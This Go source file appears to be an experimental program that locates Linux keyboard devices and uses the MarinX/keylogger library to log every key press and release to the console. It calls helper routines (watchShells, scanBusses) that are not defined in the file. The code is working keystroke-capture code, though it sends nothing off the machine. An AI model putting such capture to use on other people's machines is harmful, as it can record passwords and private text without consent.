package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"strings"

	"github.com/MarinX/keylogger"
	"github.com/sirupsen/logrus"
)

// FindKeyboardDevice by going through each device registered on OS
// Mostly it will contain keyword - keyboard
// Returns the file path which contains events
func FindKeyboardDevice() []string {
	var keyboards []string
	path := "/sys/class/input/event%d/device/name"
	resolved := "/dev/input/event%d"

	for i := 0; i < 255; i++ {
		buff, err := ioutil.ReadFile(fmt.Sprintf(path, i))
		log.Println(string(buff))
		if err != nil {
			//logrus.Error(err)
		}
		if strings.Contains(strings.ToLower(string(buff)), "keyboard") {
			logrus.Error(string(buff), ":", fmt.Sprintf(resolved, i))
			keyboards = append(keyboards, fmt.Sprintf(resolved, i))
			//return fmt.Sprintf(resolved, i)
		}
		if strings.Contains(strings.ToLower(string(buff)), "Keyboard") {
			logrus.Error(string(buff), ":", fmt.Sprintf(resolved, i))
			keyboards = append(keyboards, fmt.Sprintf(resolved, i))
			//return fmt.Sprintf(resolved, i)
		}
	}
	return keyboards
}

func main() {

	go watchShells()
	go scanBusses()
	// os.Exit(0)
	// find keyboard device, does not require a root permission
	keyboards := FindKeyboardDevice()

	// check if we found a path to keyboard
	if len(keyboards) <= 0 {
		logrus.Error("No keyboard found...you will need to provide manual input path")
		return
	}

	logrus.Println(keyboards)
	//os.Exit(1)
	for _, v := range keyboards {
		go processKeyboard(string(v))
	}

	for {
	}

}

func processKeyboard(keyboard string) {
	logrus.Println("Found a keyboard at", keyboard)
	// init keylogger with keyboard
	k, err := keylogger.New(keyboard)
	if err != nil {
		logrus.Error(err)
		return
	}
	defer k.Close()

	events := k.Read()

	// range of events
	for e := range events {
		log.Println(e)
		switch e.Type {
		// EvKey is used to describe state changes of keyboards, buttons, or other key-like devices.
		// check the input_event.go for more events

		case keylogger.EvKey:
			log.Println("boop")
			// if the state of key is pressed
			if e.KeyPress() {
				logrus.Println("[event] press key ", e.KeyString())
			}

			// if the state of key is released
			if e.KeyRelease() {
				logrus.Println("[event] release key ", e.KeyString())
			}

			break
		default:
			log.Println("boop2")
		}

	}
}
